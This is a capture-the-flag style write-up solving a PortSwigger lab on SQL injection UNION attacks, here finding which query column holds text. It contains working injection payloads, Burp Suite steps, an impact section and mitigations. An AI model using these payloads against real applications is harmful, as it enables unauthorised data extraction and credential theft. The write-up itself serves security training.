# 🔗 Lab 04: SQL Injection — UNION Attack (Finding a Column Containing Text)

> **Lab URL:** [PortSwigger Web Security Academy](https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text)  
> **Difficulty:** 🟡 Practitioner  
> **Status:** ✅ Solved

---

## 📋 Lab Description

> *"This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you first need to determine the number of columns returned by the query. You can do this using a technique you learned in a previous lab. The next step is to identify a column that is compatible with string data. The lab will provide a random value that you need to make the database retrieve. To solve the lab, perform a SQL injection UNION attack that returns an additional row containing the value provided. This technique helps you determine which columns are compatible with string data."*

---

## 🔍 Reconnaissance

### Step 1: Identify the Injection Point
The application has a product category filter. Clicking different categories changes the URL:

```
https://<lab-id>.web-security-academy.net/filter?category=Lifestyle
```

The `category` parameter is directly passed to the backend SQL query.

### Step 2: Determine the Number of Columns
From the previous lab, I already knew this application uses a query that returns **3 columns**. I confirmed this by using the `UNION SELECT NULL` technique:

```
Lifestyle'+UNION+SELECT+NULL,NULL,NULL--
```

**Result:** ✅ **200 OK** — confirms the query returns exactly **3 columns**.

<img width="1280" height="684" alt="04-burp-3nulls-confirmed png" src="https://github.com/user-attachments/assets/e93f3f6e-40b1-495c-8c8d-9a9d50f1e46e" />



> **Note:** The intercepted request shows `UNION+SELECT+NULL,NULL,NULL` returning a `200 OK` response. All 3 columns match.

---

## 🚀 Exploitation

### Goal: Find Which Column Contains Text Data

The lab requires me to make the database retrieve a specific string: **`KYE1Ca`**. To do this, I need to find which of the 3 columns can hold **text/string data**. I tested each column position by replacing `NULL` with a string literal (`'abc'`) one at a time.

---

### Attempt 1: String in Column 1

```
Lifestyle'+UNION+SELECT+'abc',NULL,NULL--
```

**Result:** ❌ **500 Internal Server Error**

The first column does **NOT** accept text data. It's likely an integer or other non-string type.

<img width="1280" height="684" alt="04-burp-col1-string-error png" src="https://github.com/user-attachments/assets/ecec2fc8-7410-4c84-bf65-8a3937226fa6" />



> **Note:** The intercepted request shows `'abc'` in the first position with a `500 Internal Server Error`. Column 1 is not text-compatible.

---

### Attempt 2: String in Column 2

```
Lifestyle'+UNION+SELECT+NULL,'abc',NULL--
```

**Result:** ✅ **200 OK**

The second column **accepts text data**! The string `'abc'` was successfully processed by the database.

<img width="1280" height="684" alt="04-burp-col2-string-success png" src="https://github.com/user-attachments/assets/d056eba9-15af-4f48-ba61-f9ddb70ab8f8" />



> **Note:** The intercepted request shows `'abc'` in the second position with a `200 OK` response. Column 2 is text-compatible!

---

### Attempt 3: Verify in Browser

I sent the successful payload through the browser to confirm the text appears on the page:

```
/filter?category=Lifestyle'+UNION+SELECT+NULL,'abc',NULL--
```

**Result:** The page loaded successfully and displayed **`abc`** as an extra entry in the product list.

<img width="1280" height="684" alt="04-browser-abc-displayed png" src="https://github.com/user-attachments/assets/1913c56a-d187-443e-ac82-2145a13ed16c" />



> **Note:** The string `'abc'` appears in the product listing, confirming that **Column 2** renders text on the webpage.

---

### Final Payload: Retrieve the Target String

Now that I know **Column 2** is text-compatible, I replaced `'abc'` with the lab's required string **`KYE1Ca`**:

```
Lifestyle'+UNION+SELECT+NULL,'KYE1Ca',NULL--
```

**Result:** ✅ **200 OK + Lab Solved!**

<img width="1280" height="684" alt="04-sql-injection-union-text-solved png" src="https://github.com/user-attachments/assets/78acea25-bb22-4f1b-8113-f103008a4cd7" />



As seen in the screenshot:
- The payload `Lifestyle'+UNION+SELECT+NULL,'KYE1Ca',NULL--` was injected
- The page displayed **`KYE1Ca`** in the product list
- Lab shows **"Congratulations, you solved the lab!"**

---

## 🛠️ Burp Suite Intercept

I used **Burp Suite** to systematically test each column position.

### Steps:
1. Configured Firefox proxy to route through Burp Suite (127.0.0.1:8080)
2. Turned on **Intercept** in Burp Suite Proxy tab
3. Sent the request to **Repeater** for repeated testing
4. Tested each column position with `'abc'`:
   - Position 1: `UNION SELECT 'abc',NULL,NULL` → ❌ 500 Error
   - Position 2: `UNION SELECT NULL,'abc',NULL` → ✅ 200 OK
   - Position 3: (not needed, since Column 2 worked)
5. Replaced `'abc'` with `'KYE1Ca'` in Column 2 to solve the lab

---

## 📸 Proof of Concept

| Step | Payload | Response | Screenshot |
|------|---------|----------|------------|
| 1 | `UNION SELECT NULL,NULL,NULL` | 200 OK | [View](./screenshots/04-burp-3nulls-confirmed.png) |
| 2 | `UNION SELECT 'abc',NULL,NULL` | 500 Error | [View](./screenshots/04-burp-col1-string-error.png) |
| 3 | `UNION SELECT NULL,'abc',NULL` | 200 OK | [View](./screenshots/04-burp-col2-string-success.png) |
| 4 | `UNION SELECT NULL,'abc',NULL` (Browser) | abc displayed | [View](./screenshots/04-browser-abc-displayed.png) |
| 5 | `UNION SELECT NULL,'KYE1Ca',NULL` | Lab Solved | [View](./screenshots/04-sql-injection-union-text-solved.png) |

---

## 🧠 Key Takeaways

### 1. The Process
Finding a text-compatible column follows this logic:

```
Step 1: Determine column count (from previous lab)
        → 3 columns confirmed

Step 2: Test each column with a string literal
        → Column 1: 'abc' → 500 Error ❌
        → Column 2: 'abc' → 200 OK ✅
        → Column 3: (not needed)

Step 3: Inject target data into the text column
        → UNION SELECT NULL,'KYE1Ca',NULL → Solved! 🎉
```

### 2. Why This Matters
- **Data Type Compatibility:** `UNION` requires matching data types, not just column counts
- **Text columns** are needed to extract usernames, passwords, emails, etc.
- **Integer columns** will reject string payloads with a database error
- Once you find the text column, you can inject any string data you want

### 3. Enumeration Strategy
| Column | Payload | Response | Data Type |
|--------|---------|----------|-----------|
| 1st | `SELECT 'abc',NULL,NULL` | 500 Error | ❌ Not text (likely INT) |
| 2nd | `SELECT NULL,'abc',NULL` | 200 OK | ✅ **Text-compatible** |
| 3rd | `SELECT NULL,NULL,'abc'` | (not tested) | Unknown |

### 4. Impact
- **Data Exfiltration:** Once the text column is identified, sensitive data can be retrieved
- **Credential Harvesting:** Usernames, passwords, and PII can be extracted
- **Database Enumeration:** Table names, column names, and schemas become accessible

### 5. Mitigation Strategies
| Defense | Implementation |
|---------|---------------|
| **Parameterized Queries** | Use prepared statements (`?` placeholders) |
| **Input Validation** | Reject quotes, `UNION`, `SELECT`, and other SQL keywords |
| **ORM Frameworks** | Use ORMs that handle query construction securely |
| **WAF Rules** | Block `UNION SELECT` patterns |
| **Least Privilege** | Restrict database account permissions |


## 📚 References

- [PortSwigger — SQL Injection UNION Attacks](https://portswigger.net/web-security/sql-injection/union-attacks)
- [PortSwigger SQL Injection Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [OWASP SQL Injection Prevention](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [PayloadsAllTheThings - SQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)

---

## 🔗 Related Labs

| Lab | Topic | Status |
|-----|-------|--------|
| [Lab 01](../01-hidden-data) | SQL Injection — Hidden Data Retrieval | ✅ Solved |
| [Lab 02](../02-login-bypass) | SQL Injection — Login Bypass | ✅ Solved |
| [Lab 03](../03-union-columns) | SQL Injection — UNION Attack (Determining Columns) | ✅ Solved |
| [Lab 05](../05-union-data-retrieval) | SQL Injection — UNION Attack (Retrieving Data from Other Tables) | ⏳ Pending |

---

> 📝 **Author:** Saber Hasan Swoyon   
> 📅 **Date Solved:** 2026-08-26
